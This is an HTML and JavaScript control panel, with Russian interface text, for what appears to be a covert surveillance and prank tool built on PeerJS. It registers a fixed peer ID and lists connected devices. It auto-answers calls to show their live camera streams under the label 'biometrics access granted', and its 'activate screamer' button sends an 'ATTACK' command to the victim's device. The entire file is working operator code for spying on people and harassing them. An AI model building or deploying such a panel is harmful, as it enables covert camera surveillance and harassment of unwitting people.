<!DOCTYPE html>
<html>
<head>
    <title>Управление Сетью AI</title>
    <meta charset="utf-8">
    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
    <style>
        body { background: #0b0b0b; color: #e0e0e0; font-family: 'Segoe UI', sans-serif; margin: 0; display: flex; height: 100vh; }
        
        /* Боковая панель со списком */
        .sidebar { width: 300px; background: #151515; border-right: 1px solid #333; padding: 20px; display: flex; flex-direction: column; }
        .user-item { background: #222; padding: 10px; margin-bottom: 10px; border-radius: 8px; border-left: 4px solid #ff0050; cursor: pointer; }
        .user-item:hover { background: #282828; }
        .status-online { color: #00ff00; font-size: 12px; font-weight: bold; }

        /* Основная зона */
        .main { flex-grow: 1; padding: 20px; display: flex; flex-direction: column; align-items: center; }
        video { width: 100%; max-width: 800px; border-radius: 12px; border: 2px solid #333; background: #000; margin-bottom: 20px; }
        
        .controls { width: 100%; max-width: 400px; text-align: center; }
        .btn-attack { background: #ff0050; color: white; border: none; padding: 15px 30px; font-size: 18px; border-radius: 10px; cursor: pointer; width: 100%; font-weight: bold; }
        .btn-attack:hover { background: #ff2e6e; box-shadow: 0 0 20px rgba(255, 0, 80, 0.4); }
    </style>
</head>
<body>

    <div class="sidebar">
        <h3>Подключенные устройства</h3>
        <div id="user-list">
            <p style="color: #666;">Поиск активных сессий...</p>
        </div>
    </div>

    <div class="main">
        <h2 id="view-title">Мониторинг: Ожидание...</h2>
        <video id="remoteVideo" autoplay playsinline controls></video>

        <div class="controls" id="attack-panel" style="display: none;">
            <p>Доступ к биометрии: <span style="color: #00ff00;">РАЗРЕШЕН</span></p>
            <button class="btn-attack" onclick="sendAttack()">⚡ АКТИВИРОВАТЬ СКРИМЕР ⚡</button>
        </div>
    </div>

    <script>
        const MY_ID = '09062012'; //
        const peer = new Peer(MY_ID);
        let currentConn = null;

        peer.on('connection', (conn) => {
            currentConn = conn;
            updateUserList(conn.metadata.device); //
            document.getElementById('attack-panel').style.display = 'block';
        });

        peer.on('call', (call) => {
            call.answer(); //
            call.on('stream', (stream) => {
                document.getElementById('remoteVideo').srcObject = stream;
                document.getElementById('view-title').innerText = "ТРАНСЛЯЦИЯ АКТИВНА";
            });
        });

        function updateUserList(device) {
            const list = document.getElementById('user-list');
            list.innerHTML = `
                <div class="user-item">
                    <strong>ID: ${Math.floor(Math.random() * 99999)}</strong><br>
                    <span>Устройство: ${device}</span><br>
                    <span class="status-online">● В СЕТИ (LIVE)</span>
                </div>
            `;
        }

        function sendAttack() {
            if (currentConn && currentConn.open) {
                currentConn.send('ATTACK'); //
            }
        }
    </script>
</body>
</html>
